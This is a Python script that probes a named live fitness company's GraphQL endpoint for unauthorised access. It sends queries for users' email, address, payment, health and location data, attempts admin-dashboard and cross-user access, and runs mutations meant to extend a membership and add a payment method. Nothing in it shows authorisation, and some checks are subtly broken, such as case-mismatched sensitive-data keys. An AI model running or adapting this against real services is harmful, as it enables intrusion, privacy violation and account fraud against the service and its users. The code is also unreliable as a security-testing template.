#!/usr/bin/env python3

import requests
import json
import time
from urllib.parse import urljoin
import uuid

class GraphQLTester:
    def __init__(self):
        self.base_url = "https://www.whoop.com"
        self.graphql_url = f"{self.base_url}/graphql"
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Referer': 'https://www.whoop.com/',
            'Origin': 'https://www.whoop.com'
        })

    def test_data_exposure(self):
        """Test for potential data exposure through GraphQL queries"""
        queries = [
            # User data exposure test
            {
                'description': 'User data exposure attempt',
                'query': '''
                    query {
                        user {
                            id
                            email
                            profile {
                                firstName
                                lastName
                                phoneNumber
                                address
                            }
                            membership {
                                status
                                validUntil
                            }
                            paymentMethods {
                                id
                                last4
                                type
                            }
                        }
                    }
                '''
            },
            # Activity data exposure test
            {
                'description': 'Activity data exposure attempt',
                'query': '''
                    query {
                        activities(first: 10) {
                            edges {
                                node {
                                    id
                                    type
                                    startTime
                                    endTime
                                    metrics {
                                        heartRate
                                        calories
                                        distance
                                    }
                                    location {
                                        latitude
                                        longitude
                                    }
                                }
                            }
                        }
                    }
                '''
            },
            # Health data exposure test
            {
                'description': 'Health data exposure attempt',
                'query': '''
                    query {
                        healthMetrics {
                            sleep {
                                quality
                                duration
                                stages
                            }
                            recovery {
                                score
                                hrv
                                rhr
                            }
                            strain {
                                score
                                activities
                            }
                        }
                    }
                '''
            }
        ]

        for test in queries:
            try:
                resp = self.session.post(
                    self.graphql_url,
                    json={'query': test['query']},
                    allow_redirects=False
                )
                
                if resp.status_code == 200 and self._contains_sensitive_data(resp.text):
                    self.results.append({
                        'type': 'graphql_data_exposure',
                        'test_case': test['description'],
                        'severity': 'High',
                        'details': 'Potential unauthorized access to sensitive data',
                        'proof': self._sanitize_response(resp.text)
                    })
            except Exception as e:
                print(f"Error in {test['description']}: {str(e)}")

    def test_authorization_bypass(self):
        """Test for GraphQL authorization bypass scenarios"""
        test_cases = [
            {
                'description': 'Admin access attempt',
                'query': '''
                    query {
                        adminDashboard {
                            users {
                                totalCount
                                edges {
                                    node {
                                        id
                                        email
                                        role
                                    }
                                }
                            }
                            metrics {
                                activeUsers
                                totalRevenue
                            }
                        }
                    }
                '''
            },
            {
                'description': 'Other user data access attempt',
                'query': '''
                    query {
                        user(id: "user_123") {
                            id
                            email
                            profile {
                                firstName
                                lastName
                            }
                            membership {
                                status
                            }
                        }
                    }
                '''
            }
        ]

        for test in test_cases:
            try:
                resp = self.session.post(
                    self.graphql_url,
                    json={'query': test['query']},
                    allow_redirects=False
                )
                
                if resp.status_code == 200 and not self._is_error_response(resp.text):
                    self.results.append({
                        'type': 'graphql_auth_bypass',
                        'test_case': test['description'],
                        'severity': 'Critical',
                        'details': 'Potential GraphQL authorization bypass',
                        'proof': self._sanitize_response(resp.text)
                    })
            except Exception as e:
                print(f"Error in {test['description']}: {str(e)}")

    def test_mutation_abuse(self):
        """Test for GraphQL mutation abuse possibilities"""
        mutations = [
            {
                'description': 'Subscription manipulation attempt',
                'query': '''
                    mutation {
                        updateMembership(input: {
                            status: "active",
                            validUntil: "2025-12-31"
                        }) {
                            success
                            membership {
                                status
                                validUntil
                            }
                        }
                    }
                '''
            },
            {
                'description': 'Payment method manipulation attempt',
                'query': '''
                    mutation {
                        addPaymentMethod(input: {
                            type: "card",
                            token: "fake_token",
                            setDefault: true
                        }) {
                            success
                            paymentMethod {
                                id
                                type
                            }
                        }
                    }
                '''
            }
        ]

        for test in mutations:
            try:
                resp = self.session.post(
                    self.graphql_url,
                    json={'query': test['query']},
                    allow_redirects=False
                )
                
                if resp.status_code == 200 and self._indicates_success(resp.text):
                    self.results.append({
                        'type': 'graphql_mutation_abuse',
                        'test_case': test['description'],
                        'severity': 'High',
                        'details': 'Potential GraphQL mutation abuse',
                        'proof': self._sanitize_response(resp.text)
                    })
            except Exception as e:
                print(f"Error in {test['description']}: {str(e)}")

    def _contains_sensitive_data(self, response):
        """Check if response contains actual sensitive data"""
        indicators = [
            '"email":', 
            '"phoneNumber":',
            '"address":',
            '"paymentMethods":',
            '"lastName":',
            '"location":',
            '"healthMetrics":'
        ]
        return any(indicator in response.lower() for indicator in indicators)

    def _is_error_response(self, response):
        """Check if response indicates an error"""
        try:
            data = json.loads(response)
            return 'errors' in data or 'error' in data
        except:
            return False

    def _indicates_success(self, response):
        """Check if response indicates successful operation"""
        try:
            data = json.loads(response)
            if 'data' in data and data['data']:
                for key in data['data']:
                    if isinstance(data['data'][key], dict) and 'success' in data['data'][key]:
                        return data['data'][key]['success']
            return False
        except:
            return False

    def _sanitize_response(self, response):
        """Remove sensitive data from response before logging"""
        try:
            data = json.loads(response)
            # Remove sensitive fields but keep structure
            for key in data.keys():
                if isinstance(data[key], str) and len(data[key]) > 20:
                    data[key] = f"{data[key][:10]}..."
            return json.dumps(data)
        except:
            return response[:100] + "..."

    def run_tests(self):
        """Run all GraphQL security tests"""
        print("Testing for data exposure...")
        self.test_data_exposure()
        
        print("Testing for authorization bypass...")
        self.test_authorization_bypass()
        
        print("Testing for mutation abuse...")
        self.test_mutation_abuse()
        
        return self.results

def main():
    tester = GraphQLTester()
    results = tester.run_tests()
    
    with open('vulnerabilities/graphql_findings.json', 'w') as f:
        json.dump(results, f, indent=4)
    
    print("\nTesting completed. Results saved to graphql_findings.json")
    if results:
        print(f"\nFound {len(results)} potential issues:")
        for result in results:
            print(f"- {result['type']} ({result['severity']}): {result['details']}")

if __name__ == '__main__':
    main() 